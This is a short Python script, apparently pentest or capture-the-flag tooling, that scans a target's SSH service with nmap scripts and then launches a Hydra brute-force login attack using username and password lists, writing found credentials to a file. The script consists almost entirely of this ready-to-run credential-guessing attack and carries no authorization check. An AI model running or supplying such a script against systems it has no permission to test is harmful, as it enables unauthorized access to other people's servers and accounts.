import subprocess

def enumerate_ssh(ip, port=22):
    """
    Enumerates SSH service on the target IP and port.

    :param ip: The target IP address.
    :param port: The target port number (default is 22).
    """
    print(f"Enumerating SSH on {ip}:{port}")

    # Run Nmap SSH scripts
    nmap_command = ['nmap', '-p', str(port), '--script', 'ssh-hostkey,ssh-auth-methods', ip]
    subprocess.run(nmap_command)

    # Attempt brute-force attack using Hydra
    hydra_command = ['hydra', '-L', 'usernames.txt', '-P', 'passwords.txt', '-f', '-o', 'hydra_ssh_results.txt', '-u', ip, '-s', str(port), 'ssh']
    subprocess.run(hydra_command)
